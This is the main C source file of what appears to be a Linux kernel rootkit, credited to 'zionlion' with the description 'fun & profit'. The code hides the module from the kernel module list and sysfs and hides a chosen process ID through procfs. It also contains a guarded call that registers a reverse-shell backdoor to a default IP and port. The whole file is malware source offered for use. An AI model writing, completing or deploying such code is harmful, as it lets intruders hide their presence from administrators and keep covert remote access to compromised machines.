#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>

#include "err.h"
#include "nf_hooks.h"
#include "memory_prot.h"
#include "procfs_ops.h"

MODULE_AUTHOR("zionlion");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("fun & profit");

static bool is_module_hidden = false;
static void hide_module(void)
{
	if (is_module_hidden) {
		log_err("Module is already hiddden\n");
		return;
	}
	list_del_init(&(THIS_MODULE->list));
	/* unlink kobject from sysfs without freeing memory */
	kobject_del(&(THIS_MODULE->mkobj.kobj));
	list_del_init(&(THIS_MODULE->mkobj.kobj.entry));
}

#define TEST_PID "6403"

static int __init zl_init(void)
{
	log_err("Module loaded\n");
#ifdef FINISHED
	hide_module();
	if (register_backdoor(DEFAULT_IP, DEFAULT_PORT, DEFAULT_RSHELL_PATH))
		log_err("Problem registering backdoor\n");
#endif
	if (!init_procfs()) {
		log_err("procfs problem\n");
		return 0;
	}
	if (!hide_pid(TEST_PID))
		log_err("error hiding pid\n");
	return 0;
}

static void __exit zl_exit(void)
{
	//unregister_backdoor();
	if (!unhide_pid(TEST_PID))
		log_err("error unhiding pid\n");
	cleanup_procfs();
	log_err("Unloading module\n");
}

module_init(zl_init);
module_exit(zl_exit);
